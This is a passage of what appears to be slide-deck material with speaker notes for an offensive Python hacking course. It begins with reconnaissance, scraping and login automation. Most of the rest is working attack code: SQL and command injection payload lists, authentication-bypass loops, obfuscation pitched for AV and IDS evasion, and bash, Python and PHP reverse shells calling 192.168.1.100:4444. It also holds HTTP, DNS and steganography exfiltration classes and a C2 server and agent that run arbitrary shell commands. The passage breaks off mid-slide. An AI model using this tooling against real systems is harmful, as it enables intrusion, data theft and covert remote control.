│               return BruteForceResult(                     │
│                   path=path,                                │
│                   status_code=response.status_code,        │
│                   content_length=len(response.content)     │
│               )                                             │
│       except:                                               │
│           return None                                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show path generation
- Explain extension handling
- Discuss status code filtering

---

#### Slide 2.2.4: Wordlist Generator
```python
┌─────────────────────────────────────────────────────────────┐
│                    WORDLIST GENERATOR                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   class WordlistGenerator:                                  │
│       def generate_permutations(self, words):              │
│           generated = set()                                 │
│                                                             │
│           for word in words:                               │
│               generated.add(word)                          │
│                                                             │
│               # Add prefixes                                │
│               for prefix in ['admin', 'web', 'app']:       │
│                   generated.add(f"{prefix}_{word}")        │
│                   generated.add(f"{prefix}{word}")         │
│                                                             │
│               # Add suffixes                                │
│               for suffix in ['admin', 'panel', 'backup']:  │
│                   generated.add(f"{word}_{suffix}")        │
│                   generated.add(f"{word}{suffix}")         │
│                                                             │
│               # Add years                                   │
│               for year in range(2020, 2026):               │
│                   generated.add(f"{word}{year}")           │
│                                                             │
│           return sorted(generated)                         │
│                                                             │
│   Technology-specific words:                                │
│   WordPress → wp-admin, wp-content, wp-config.php        │
│   PHP → index.php, admin.php, config.php                  │
│   Python → manage.py, settings.py, requirements.txt       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show permutation generation
- Explain technology-specific wordlists
- Discuss year variations

---

### Phase 2.3: HTML Parsing & Analysis

#### Slide 2.3.1: HTML Analysis Concept
```
┌─────────────────────────────────────────────────────────────┐
│                    HTML ANALYSIS CONCEPT                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Like a detective examining a crime scene:                │
│                                                             │
│   • HTML Document = Crime scene                            │
│   • Tags = Different rooms                                 │
│   • Attributes = Items in rooms                            │
│   • Comments = Hidden notes                                │
│   • Forms = Entry/exit points                              │
│   • JavaScript = Security systems                          │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   What we extract:                                          │
│   • Meta data - Page information                           │
│   • Forms - Input parameters                              │
│   • Links - Navigation paths                               │
│   • Comments - Developer notes                             │
│   • Scripts - JavaScript code                              │
│   • Emails - Contact information                           │
│   • Sensitive data - Credentials, API keys                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Use the detective analogy
- Explain what we're looking for
- Show extraction capabilities

---

#### Slide 2.3.2: BeautifulSoup Basics
```python
┌─────────────────────────────────────────────────────────────┐
│                    BEAUTIFULSOUP BASICS                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   from bs4 import BeautifulSoup                             │
│                                                             │
│   # Parse HTML                                              │
│   soup = BeautifulSoup(html_content, 'lxml')               │
│                                                             │
│   # Find elements                                           │
│   title = soup.title.string                                │
│   meta = soup.find_all('meta')                            │
│   links = soup.find_all('a', href=True)                   │
│   forms = soup.find_all('form')                           │
│                                                             │
│   # Find by attribute                                       │
│   meta_desc = soup.find('meta', {'name': 'description'})  │
│                                                             │
│   # Extract forms                                           │
│   for form in soup.find_all('form'):                       │
│       action = form.get('action')                          │
│       method = form.get('method', 'GET')                   │
│       inputs = form.find_all('input')                     │
│                                                             │
│       for input_tag in inputs:                             │
│           name = input_tag.get('name')                     │
│           type = input_tag.get('type')                     │
│           value = input_tag.get('value')                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show BeautifulSoup syntax
- Demonstrate element finding
- Explain form extraction

---

#### Slide 2.3.3: Form Analysis
```python
┌─────────────────────────────────────────────────────────────┐
│                    FORM ANALYSIS                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   def analyze_form(form):                                   │
│       form_data = {                                         │
│           'action': form.get('action'),                    │
│           'method': form.get('method', 'GET'),             │
│           'inputs': []                                      │
│       }                                                     │
│                                                             │
│       for input_tag in form.find_all(['input', 'select']):│
│           input_data = {                                    │
│               'name': input_tag.get('name'),               │
│               'type': input_tag.get('type', 'text'),       │
│               'value': input_tag.get('value')              │
│           }                                                 │
│                                                             │
│           # Check for sensitive types                      │
│           if input_data['type'] == 'password':             │
│               form_data['has_password'] = True             │
│           if input_data['type'] == 'hidden':               │
│               form_data['has_hidden'] = True              │
│           if input_data['type'] == 'file':                 │
│               form_data['has_file_upload'] = True          │
│                                                             │
│           form_data['inputs'].append(input_data)           │
│                                                             │
│       return form_data                                      │
│                                                             │
│   # CSRF Detection                                          │
│   for input in form['inputs']:                             │
│       if 'csrf' in input['name'].lower():                  │
│           print(f"[!] CSRF token found: {input['name']}") │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show form parsing logic
- Explain input type detection
- Discuss CSRF token identification

---

#### Slide 2.3.4: Sensitive Data Detection
```python
┌─────────────────────────────────────────────────────────────┐
│                    SENSITIVE DATA DETECTION                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   # Common patterns to look for                             │
│   SENSITIVE_PATTERNS = {                                    │
│       'api_key': re.compile(                               │
│           r'(api[_-]?key|apikey)\s*[:=]\s*["\']?([^"\']+)',│
│           re.IGNORECASE                                    │
│       ),                                                    │
│       'secret': re.compile(                                │
│           r'(secret|token|password)\s*[:=]\s*["\']?([^"\']+)',│
│           re.IGNORECASE                                    │
│       ),                                                    │
│       'email': re.compile(                                 │
│           r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'│
│       ),                                                    │
│       'aws_key': re.compile(r'AKIA[0-9A-Z]{16}'),          │
│       'jwt': re.compile(                                   │
│           r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'│
│       )                                                     │
│   }                                                         │
│                                                             │
│   # Usage                                                   │
│   for pattern_name, pattern in SENSITIVE_PATTERNS.items(): │
│       matches = pattern.findall(html_content)              │
│       if matches:                                           │
│           print(f"[!] Found {pattern_name}: {matches}")   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show sensitive data patterns
- Explain regex usage
- Discuss different types

---

### Phase 2.4: Authentication Automation

#### Slide 2.4.1: Authentication Types
```
┌─────────────────────────────────────────────────────────────┐
│                    AUTHENTICATION TYPES                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Like entering a secured building:                        │
│                                                             │
│   • Username/Password = ID badge                           │
│   • Session Cookie = Temporary pass                        │
│   • JWT Token = Signed pass                                │
│   • OAuth = Using another ID                               │
│   • 2FA = Extra security check                             │
│   • CSRF Token = Unique code for each door                │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   Types:                                                    │
│   • Basic Auth - Headers only                              │
│   • Session-based - Cookie after login                     │
│   • JWT - Self-contained token                             │
│   • OAuth - Third-party auth                               │
│   • API Keys - Simple token for APIs                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Use the building security analogy
- Explain different auth types
- Show when each is used

---

#### Slide 2.4.2: CSRF Token Extraction
```python
┌─────────────────────────────────────────────────────────────┐
│                    CSRF TOKEN EXTRACTION                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   def extract_csrf_token(html_content):                    │
│       # Common CSRF field names                             │
│       patterns = [                                          │
│           r'<input[^>]*name=["\'](csrf_token|_token)["\']' │
│           r'[^>]*value=["\']([^"\']+)["\']',               │
│           r'<input[^>]*value=["\']([^"\']+)["\'][^>]*'     │
│           r'name=["\'](csrf_token|_token)["\']',           │
│           r'<meta[^>]*name=["\']csrf-token["\'][^>]*'      │
│           r'content=["\']([^"\']+)["\']'                   │
│       ]                                                     │
│                                                             │
│       for pattern in patterns:                              │
│           match = re.search(pattern, html_content,         │
│                            re.IGNORECASE)                  │
│           if match:                                         │
│               return match.group(2)                        │
│                                                             │
│       return None                                           │
│                                                             │
│   # Login with CSRF                                         │
│   def login_basic(self, url, username, password):          │
│       # Get login page                                      │
│       response = self.client.get(url)                      │
│       csrf = self.extract_csrf_token(response.text)        │
│                                                             │
│       # Submit login                                        │
│       login_data = {                                        │
│           'username': username,                             │
│           'password': password,                             │
│           'csrf_token': csrf                               │
│       }                                                     │
│       response = self.client.post(url, data=login_data)   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show CSRF extraction patterns
- Explain token submission
- Demonstrate complete login flow

---

#### Slide 2.4.3: JWT Authentication
```python
┌─────────────────────────────────────────────────────────────┐
│                    JWT AUTHENTICATION                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   def login_jwt(self, login_url, username, password):      │
│       # Login request                                       │
│       response = self.client.post(                         │
│           login_url,                                        │
│           json={'username': username, 'password': password}│
│       )                                                     │
│                                                             │
│       if response.status_code != 200:                      │
│           return None                                       │
│                                                             │
│       # Extract token from response                        │
│       token = None                                          │
│       json_data = response.json()                          │
│                                                             │
│       # Try common token fields                             │
│       for field in ['token', 'access_token', 'jwt']:       │
│           if field in json_data:                           │
│               token = json_data[field]                     │
│               break                                         │
│                                                             │
│       if not token and 'data' in json_data:                │
│           if isinstance(json_data['data'], dict):          │
│               for field in ['token', 'access_token']:      │
│                   if field in json_data['data']:           │
│                       token = json_data['data'][field]     │
│                                                             │
│       # Set token for future requests                      │
│       self.set_auth_bearer(token)                          │
│       return token                                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Explain JWT structure
- Show token extraction
- Demonstrate Bearer auth

---

## Part 3: Offensive Tooling & Payload Crafting

### Phase 3.1: API Intelligence

#### Slide 3.1.1: API Reconnaissance
```
┌─────────────────────────────────────────────────────────────┐
│                    API RECONNAISSANCE                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Like exploring a restaurant menu:                        │
│                                                             │
│   • REST API = Standard menu                               │
│   • GraphQL = Customizable menu                            │
│   • Endpoint = Specific dish                               │
│   • JSON/XML = Order format                                │
│   • API Key = Loyalty card                                 │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   What we discover:                                         │
│   • Available endpoints                                    │
│   • Authentication requirements                            │
│   • Data formats                                           │
│   • Rate limits                                            │
│   • Potential vulnerabilities                              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Use the restaurant menu analogy
- Explain API components
- Show discovery process

---

#### Slide 3.1.2: GraphQL Introspection
```python
┌─────────────────────────────────────────────────────────────┐
│                    GRAPHQL INTROSPECTION                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   def graphql_introspection(self):                         │
│       introspection_query = """                            │
│       query IntrospectionQuery {                           │
│           __schema {                                        │
│               queryType { name }                           │
│               types {                                       │
│                   name                                      │
│                   kind                                      │
│                   fields {                                  │
│                       name                                  │
│                       type { name }                        │
│                   }                                         │
│               }                                             │
│           }                                                 │
│       }                                                     │
│       """                                                   │
│                                                             │
│       result = self.graphql_query(introspection_query)    │
│                                                             │
│       if result:                                            │
│           schema = result['data']['__schema']              │
│           for type in schema['types']:                     │
│               if type['kind'] == 'OBJECT':                 │
│                   print(f"Type: {type['name']}")           │
│                   for field in type.get('fields', []):     │
│                       print(f"  {field['name']}")          │
│                                                             │
│       return result                                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Explain GraphQL introspection
- Show schema discovery
- Discuss security implications

---

### Phase 3.2: Exploit Development

#### Slide 3.2.1: Exploit Framework
```
┌─────────────────────────────────────────────────────────────┐
│                    EXPLOIT FRAMEWORK                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   ┌─────────────────────────────────────────────────────┐   │
│   │                    Exploit                          │   │
│   │  (Base Class)                                      │   │
│   │  - target                                         │   │
│   │  - client                                         │   │
│   │  - vulnerability_type                             │   │
│   └──────────────────┬────────────────────────────────┘   │
│                      │                                      │
│        ┌─────────────┼─────────────┐                       │
│        │             │             │                       │
│        ▼             ▼             ▼                       │
│   ┌──────────┐ ┌──────────┐ ┌──────────┐                  │
│   │  SQLi    │ │ Command  │ │  RFI     │                  │
│   │ Exploit  │ │Injection │ │ Exploit  │                  │
│   └──────────┘ └──────────┘ └──────────┘                  │
│                                                             │
│   ┌─────────────────────────────────────────────────────┐   │
│   │               ExploitManager                        │   │
│   │  - add_exploit()                                   │   │
│   │  - run_all()                                      │   │
│   │  - get_report()                                   │   │
│   └─────────────────────────────────────────────────────┘   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show the class hierarchy
- Explain the exploit lifecycle
- Demonstrate manager usage

---

#### Slide 3.2.2: SQL Injection
```python
┌─────────────────────────────────────────────────────────────┐
│                    SQL INJECTION                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   class SQLInjectionExploit(Exploit):                      │
│       def __init__(self, target, parameter):               │
│           super().__init__("SQL Injection", target)       │
│           self.parameter = parameter                       │
│                                                             │
│       def exploit(self):                                   │
│           payloads = [                                      │
│               "' OR '1'='1",                               │
│               "' UNION SELECT NULL--",                     │
│               "'; DROP TABLE users--",                     │
│               "' OR 1=1--"                                 │
│           ]                                                 │
│                                                             │
│           for payload in payloads:                         │
│               url = f"{self.target}?{self.parameter}={     │
│                       payload}"                            │
│                                                             │
│               response = self.client.get(url)              │
│                                                             │
│               # Check for error patterns                   │
│               if self._is_vulnerable(response):            │
│                   return ExploitResult(                    │
│                       success=True,                         │
│                       vulnerability_type="SQL Injection",  │
│                       payload=payload,                      │
│                       response=response.text               │
│                   )                                         │
│                                                             │
│           return ExploitResult(success=False)              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show SQL injection payloads
- Explain detection logic
- Demonstrate exploit execution

---

#### Slide 3.2.3: Command Injection
```python
┌─────────────────────────────────────────────────────────────┐
│                    COMMAND INJECTION                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   class CommandInjectionExploit(Exploit):                  │
│       def exploit(self):                                   │
│           payloads = [                                      │
│               "; ls",                                       │
│               "| whoami",                                   │
│               "|| id",                                      │
│               "&& cat /etc/passwd"                         │
│           ]                                                 │
│                                                             │
│           for payload in payloads:                         │
│               url = f"{self.target}?{self.parameter}={     │
│                       urllib.parse.quote(payload)}"        │
│                                                             │
│               response = self.client.get(url)              │
│                                                             │
│               # Check for command output                   │
│               if self._is_vulnerable(response):            │
│                   return ExploitResult(                    │
│                       success=True,                         │
│                       vulnerability_type="Command Injection",│
│                       payload=payload,                      │
│                       output=response.text                  │
│                   )                                         │
│                                                             │
│           return ExploitResult(success=False)              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show command injection payloads
- Explain output detection
- Demonstrate execution

---

#### Slide 3.2.4: Authentication Bypass
```python
┌─────────────────────────────────────────────────────────────┐
│                    AUTHENTICATION BYPASS                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   class AuthenticationBypassExploit(Exploit):              │
│       def exploit(self):                                   │
│           username_payloads = [                             │
│               "admin",                                      │
│               "' OR '1'='1",                               │
│               "admin'--",                                   │
│               "admin' OR 1=1--"                           │
│           ]                                                 │
│                                                             │
│           password_payloads = [                             │
│               "password",                                   │
│               "' OR '1'='1",                               │
│               "anything"                                    │
│           ]                                                 │
│                                                             │
│           for username in username_payloads:               │
│               for password in password_payloads:           │
│                   data = {                                  │
│                       'username': username,                 │
│                       'password': password                  │
│                   }                                         │
│                                                             │
│                   response = self.client.post(             │
│                       self.target, data=data               │
│                   )                                         │
│                                                             │
│                   if response.status_code in [200, 302]:  │
│                       if 'login' not in response.url:     │
│                           return ExploitResult(            │
│                               success=True                  │
│                           )                                 │
│                                                             │
│           return ExploitResult(success=False)              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show bypass payloads
- Explain detection logic
- Demonstrate successful bypass

---

### Phase 3.3: Payload Obfuscation

#### Slide 3.3.1: Obfuscation Concept
```
┌─────────────────────────────────────────────────────────────┐
│                    OBFUSCATION CONCEPT                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Like speaking in code to avoid eavesdroppers:           │
│                                                             │
│   • Original = "Meet me at midnight"                      │
│   • Obfuscated = "M33t m3 @ m1dn1ght"                    │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   Why we obfuscate:                                         │
│   • AV Evasion - Signature detection                       │
│   • IDS/IPS Bypass - Pattern matching                      │
│   • Filter Bypass - Input filters                          │
│   • Stealth - Hide true purpose                            │
│                                                             │
│   Common techniques:                                        │
│   • Encoding (Base64, Hex)                                 │
│   • Encryption (XOR, Caesar)                               │
│   • Compression (zlib)                                     │
│   • Multiple layers                                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Use the code language analogy
- Explain obfuscation purposes
- List common techniques

---

#### Slide 3.3.2: Encoding Methods
```python
┌─────────────────────────────────────────────────────────────┐
│                    ENCODING METHODS                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   import base64, binascii                                   │
│                                                             │
│   # Base64                                                  │
│   def encode_base64(data):                                  │
│       return base64.b64encode(data.encode()).decode()     │
│                                                             │
│   # Example: whoami → d2hvYW1p                             │
│                                                             │
│   # Hex                                                     │
│   def encode_hex(data):                                     │
│       return binascii.hexlify(data.encode()).decode()     │
│                                                             │
│   # Example: whoami → 77686f616d69                        │
│                                                             │
│   # XOR                                                     │
│   def encode_xor(data, key):                               │
│       data_bytes = data.encode()                           │
│       key_bytes = key.encode() * (len(data)//len(key)+1)  │
│       result = bytes([a ^ b for a, b in                   │
│                       zip(data_bytes, key_bytes)])         │
│       return binascii.hexlify(result).decode()            │
│                                                             │
│   # Example: whoami XOR secret → 1a2b3c4d5e6f             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show each encoding method
- Demonstrate with examples
- Explain strengths of each

---

#### Slide 3.3.3: Multi-Layer Obfuscation
```python
┌─────────────────────────────────────────────────────────────┐
│                    MULTI-LAYER OBFUSCATION                  │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   class ObfuscationEngine:                                  │
│       def multi_encode(self, data, techniques):            │
│           result = data                                     │
│                                                             │
│           for technique in techniques:                     │
│               if technique == 'base64':                    │
│                   result = self.encode_base64(result)     │
│               elif technique == 'hex':                     │
│                   result = self.encode_hex(result)        │
│               elif technique == 'rot13':                   │
│                   result = self.encode_rot13(result)      │
│                                                             │
│           return result                                     │
│                                                             │
│   # Example                                                  │
│   engine = ObfuscationEngine()                             │
│                                                             │
│   original = "whoami"                                       │
│   obfuscated = engine.multi_encode(                        │
│       original,                                            │
│       ['rot13', 'base64', 'hex']                          │
│   )                                                         │
│                                                             │
│   # Result:                                                 │
│   # Original: whoami                                       │
│   # ROT13: jubnzv                                         │
│   # Base64: anVibnp2                                          │
│   # Hex: 616e5649626e7032                                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show multi-layer encoding
- Demonstrate the process
- Explain reversing the process

---

#### Slide 3.3.4: Reverse Shell Payloads
```python
┌─────────────────────────────────────────────────────────────┐
│                    REVERSE SHELL PAYLOADS                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   # Bash                                                    │
│   bash_shell = "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"│
│                                                             │
│   # Python                                                  │
│   python_shell = """                                        │
│   python -c 'import socket,os,pty;                          │
│   s=socket.socket();                                       │
│   s.connect((\"192.168.1.100\",4444));                     │
│   os.dup2(s.fileno(),0);                                   │
│   os.dup2(s.fileno(),1);                                   │
│   os.dup2(s.fileno(),2);                                   │
│   pty.spawn(\"/bin/sh\")'                                  │
│   """                                                       │
│                                                             │
│   # PHP                                                     │
│   php_shell = """                                           │
│   <?php $s=fsockopen("192.168.1.100",4444);               │
│   exec("/bin/sh -i <&3 >&3 2>&3"); ?>                     │
│   """                                                       │
│                                                             │
│   # Obfuscated Base64                                       │
│   import base64                                             │
│   encoded = base64.b64encode(bash_shell.encode()).decode() │
│   # Result: YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==│
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show multiple language payloads
- Explain reverse shell concept
- Demonstrate obfuscation

---

### Phase 3.4: Data Exfiltration

#### Slide 3.4.1: Exfiltration Channels
```
┌─────────────────────────────────────────────────────────────┐
│                    EXFILTRATION CHANNELS                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Like a spy stealing documents:                           │
│                                                             │
│   • Data = Secret documents                                │
│   • Channel = How to get them out                          │
│   • Covert Channel = Hiding in innocent items              │
│   • Tunneling = One method carrying another               │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   Channels we use:                                          │
│   • HTTP - Blends with web traffic                         │
│   • DNS - Often allowed through firewalls                  │
│   • ICMP - Simple, not commonly logged                     │
│   • Steganography - Hidden in images                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Use the spy analogy
- Explain channel selection
- Discuss pros and cons

---

#### Slide 3.4.2: HTTP Exfiltration
```python
┌─────────────────────────────────────────────────────────────┐
│                    HTTP EXFILTRATION                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   class HTTPExfiltration(ExfiltrationBase):                │
│       def _send(self, data):                               │
│           # Encode data                                     │
│           encoded = base64.b64encode(data).decode()       │
│                                                             │
│           # Split into chunks                               │
│           chunks = [encoded[i:i+1000] for i in            │
│                    range(0, len(encoded), 1000)]          │
│                                                             │
│           for chunk in chunks:                             │
│               if self.method == 'GET':                    │
│                   url = f"{self.url}?{self.param_name}={   │
│                           urllib.parse.quote(chunk)}"     │
│                   response = requests.get(url)             │
│               else:                                         │
│                   response = requests.post(                │
│                       self.url,                             │
│                       data={self.param_name: chunk}        │
│                   )                                         │
│                                                             │
│               if response.status_code != 200:             │
│                   print(f"Exfil failed: {response.status}")│
│                                                             │
│               time.sleep(0.1)  # Avoid rate limiting       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show HTTP channel implementation
- Explain chunking
- Discuss rate limiting

---

#### Slide 3.4.3: DNS Exfiltration
```python
┌─────────────────────────────────────────────────────────────┐
│                    DNS EXFILTRATION                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   class DNSExfiltration(ExfiltrationBase):                 │
│       def _send(self, data):                               │
│           # Encode data                                     │
│           encoded = base64.b64encode(data).decode()       │
│           encoded = encoded.replace('=', '')              │
│                                                             │
│           # Split into chunks (max 20 chars per subdomain) │
│           chunks = [encoded[i:i+20] for i in              │
│                    range(0, len(encoded), 20)]            │
│                                                             │
│           for i, chunk in enumerate(chunks):              │
│               # Create subdomain                            │
│               subdomain = f"{chunk}.{self.domain}"        │
│                                                             │
│               try:                                          │
│                   # DNS lookup                              │
│                   socket.gethostbyname(subdomain)          │
│                   print(f"Exfil chunk {i}: {subdomain}")   │
│               except socket.gaierror:                      │
│                   # Expected - we just want the query     │
│                   pass                                      │
│                                                             │
│               time.sleep(self.delay)                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show DNS channel implementation
- Explain subdomain encoding
- Discuss DNS query limits

---

#### Slide 3.4.4: Steganography
```python
┌─────────────────────────────────────────────────────────────┐
│                    STEGANOGRAPHY                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   class SteganographyExfiltration(ExfiltrationBase):       │
│       def _send(self, data):                               │
│           # Load image                                      │
│           img = Image.open(self.image_path)               │
│           img = img.convert('RGB')                         │
│           pixels = img.load()                               │
│           width, height = img.size                         │
│                                                             │
│           # Add header with data length                    │
│           header = struct.pack('!I', len(data))           │
│           data = header + data                             │
│                                                             │
│           # Convert to bits                                 │
│           data_bits = []                                    │
│           for byte in data:                                │
│               for i in range(7, -1, -1):                  │
│                   data_bits.append((byte >> i) & 1)       │
│                                                             │
│           # Embed using LSB                                 │
│           bit_index = 0                                     │
│           for y in range(height):                          │
│               for x in range(width):                       │
│                   if bit_index >= len(data_bits):         │
│                       break                                 │
│                                                             │
│                   r, g, b = pixels[x, y]                  │
│                   r = (r & 0xFE) | data_bits[bit_index]   │
│                   bit_index += 1                           │
│                                                             │
│                   if bit_index < len(data_bits):          │
│                       g = (g & 0xFE) | data_bits[bit_index]│
│                       bit_index += 1                       │
│                                                             │
│                   if bit_index < len(data_bits):          │
│                       b = (b & 0xFE) | data_bits[bit_index]│
│                       bit_index += 1                       │
│                                                             │
│                   pixels[x, y] = (r, g, b)                │
│                                                             │
│           img.save(self.output_path)                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show LSB steganography
- Explain embedding process
- Discuss capacity limitations

---

## Part 4: Post-Exploitation & Automation

### Phase 4.1: C2 Framework

#### Slide 4.1.1: C2 Architecture
```
┌─────────────────────────────────────────────────────────────┐
│                    C2 ARCHITECTURE                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Like a spy agency communication network:                │
│                                                             │
│   • C2 Server = Headquarters                              │
│   • Agent = Field spy                                      │
│   • Beacon = Regular check-in                              │
│   • Task = Mission orders                                  │
│   • Response = Mission results                             │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   ┌─────────────────────────────────────────────────────┐   │
│   │               C2 SERVER                             │   │
│   │  - API endpoints                                    │   │
│   │  - Database                                         │   │
│   │  - Task management                                  │   │
│   │  - Result collection                                │   │
│   └──────────────────┬────────────────────────────────┘   │
│                      │                                      │
│                      │                                      │
│   ┌──────────────────▼────────────────────────────────┐   │
│   │               C2 AGENT                            │   │
│   │  - Registration                                   │   │
│   │  - Task execution                                  │   │
│   │  - Result submission                               │   │
│   │  - Beacon/Heartbeat                                │   │
│   └─────────────────────────────────────────────────────┘   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Use the spy agency analogy
- Show server/agent relationship
- Explain communication flow

---

#### Slide 4.1.2: C2 Server Code
```python
┌─────────────────────────────────────────────────────────────┐
│                    C2 SERVER CODE                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   from flask import Flask, request, jsonify               │
│   import sqlite3                                           │
│                                                             │
│   app = Flask(__name__)                                    │
│                                                             │
│   @app.route('/c2/register', methods=['POST'])            │
│   def register():                                          │
│       data = request.json                                  │
│       agent_id = str(uuid.uuid4())                        │
│                                                             │
│       # Save to database                                   │
│       conn = sqlite3.connect('c2.db')                     │
│       cursor = conn.cursor()                              │
│       cursor.execute(                                      │
│           'INSERT INTO agents VALUES (?, ?, ?, ?, ?)',    │
│           (agent_id, data['hostname'], data['username'],  │
│            datetime.now().isoformat(), 'active')          │
│       )                                                    │
│       conn.commit()                                        │
│       conn.close()                                         │
│                                                             │
│       return jsonify({'agent_id': agent_id})              │
│                                                             │
│   @app.route('/c2/tasks/<agent_id>', methods=['GET'])    │
│   def get_tasks(agent_id):                                 │
│       # Get pending tasks from database                   │
│       conn = sqlite3.connect('c2.db')                     │
│       cursor = conn.cursor()                              │
│       tasks = cursor.execute(                             │
│           'SELECT command, params FROM tasks WHERE       │
│            agent_id = ? AND status = "pending"',         │
│           (agent_id,)                                     │
│       ).fetchall()                                        │
│                                                             │
│       return jsonify({'tasks': tasks})                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show Flask implementation
- Explain database persistence
- Demonstrate API endpoints

---

#### Slide 4.1.3: C2 Agent Code
```python
┌─────────────────────────────────────────────────────────────┐
│                    C2 AGENT CODE                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   class C2Agent:                                            │
│       def beacon(self):                                    │
│           # Get tasks                                       │
│           tasks = self.get_tasks()                         │
│                                                             │
│           for task in tasks:                               │
│               result = self.execute_task(task)            │
│               self.submit_result(result)                   │
│                                                             │
│       def execute_task(self, task):                        │
│           command = task['command']                        │
│           params = task.get('params', {})                 │
│                                                             │
│           # Built-in commands                               │
│           if command == 'whoami':                          │
│               return {'output': os.getlogin()}            │
│           elif command == 'hostname':                     │
│               return {'output': socket.gethostname()}     │
│           elif command == 'system':                        │
│               cmd = params.get('cmd', '')                 │
│               output = subprocess.check_output(           │
│                   cmd, shell=True, text=True              │
│               )                                             │
│               return {'output': output}                    │
│           elif command == 'ls':                            │
│               path = params.get('path', '.')              │
│               output = subprocess.check_output(           │
│                   ['ls', '-la', path], text=True         │
│               )                                             │
│               return {'output': output}                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show agent implementation
- Explain task execution
- Demonstrate built-in commands

---

### Phase 4.2: System Enumeration

#### Slide 4.2.1: Enumeration Categories
```
┌─────────────────────────────────────────────────────────────┐
│                    ENUMERATION CATEGORIES                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Like a detective gathering evidence:                    │
│                                                             │
│   • System = Building blueprints                          │
│   • Users = Who lives there                               │
│   • Processes = What's happening                          │
│   • Network = How it connects outside                     │
│   • Services = What's inside                              │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   Categories:                                               │
│   • System - OS, version, architecture                     │
│   • Users - User list, groups, privileges                 │
│   • Processes - Running services, connections             │
│   • Network - Interfaces, routes, ARP                     │
│   • Services - Installed services, versions               │
│   • Cron/Scheduled - Automated tasks                      │
│   • Security - Firewall, AV, SELinux                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Use the detective analogy
- Explain each category
- Discuss importance

---

#### Slide 4.2.2: System Info Code
```python
┌─────────────────────────────────────────────────────────────┐
│                    SYSTEM INFO CODE                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   import platform, psutil, socket                          │
│                                                             │
│   class SystemEnumerator:                                   │
│       def get_system_info(self):                           │
